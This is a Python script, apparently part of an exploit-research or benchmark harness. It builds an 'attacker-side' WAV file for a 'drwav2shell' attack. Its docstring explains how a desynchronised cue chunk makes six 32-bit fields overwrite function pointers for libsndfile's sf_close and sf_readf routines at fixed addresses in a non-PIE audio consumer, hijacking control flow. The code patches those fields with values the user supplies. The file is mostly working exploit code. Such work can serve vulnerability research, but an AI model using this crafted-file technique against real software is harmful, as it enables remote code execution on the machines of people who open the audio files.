#!/usr/bin/env python3
"""Attacker-side WAV fields for the drwav2shell control-flow lane.

Uses the committed make_wav.build() verbatim and replaces only six u32 fields
inside the crafted cue chunk. Nothing in the pinned header or the consumer is
modified. Field offsets are the 150-byte RIFF layout emitted by make_wav.py:

  0x7e / 0x82  low/high of the value written over libsndfile__sf_close
  0x86 / 0x8a  low/high written over libsndfile__sf_readf_short
  0x8e / 0x92  low/high written over libsndfile__sf_readf_int

The cue desync places those six consecutive u32 writes at 0x41e118..0x41e130
in the -no-pie consumer. Safe-loop files keep these fields but set the smpl
loop count (offset 0x52) to zero, so no write happens.

Usage: make_marker_wav.py OUTPUT PTR_LOW CLOSE SHORT INT [LOOP_COUNT]
"""

import struct
import sys

import make_wav

FIELDS = (0x7E, 0x86, 0x8E)
LOOP_COUNT_OFFSET = 0x52


def build(ptr_low, close, short, readf_int, loop_count=1):
    data = bytearray(make_wav.build(ptr_low, close, loop_count))
    for off, value in zip(FIELDS, (close, short, readf_int)):
        struct.pack_into("<I", data, off, value & 0xFFFFFFFF)
        struct.pack_into("<I", data, off + 4, (value >> 32) & 0xFFFFFFFF)
    struct.pack_into("<I", data, LOOP_COUNT_OFFSET, loop_count & 0xFFFFFFFF)
    return bytes(data)


def main(argv):
    if len(argv) < 5:
        print(
            "usage: make_marker_wav.py OUTPUT PTR_LOW CLOSE SHORT INT [LOOP_COUNT]",
            file=sys.stderr,
        )
        return 2
    out, ptr_low, close, short, readf_int = argv[1:6]
    loop_count = int(argv[6], 0) if len(argv) > 6 else 1
    data = build(int(ptr_low, 0), int(close, 0), int(short, 0), int(readf_int, 0), loop_count)
    with open(out, "wb") as f:
        f.write(data)
    print(f"wrote {out} ({len(data)} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
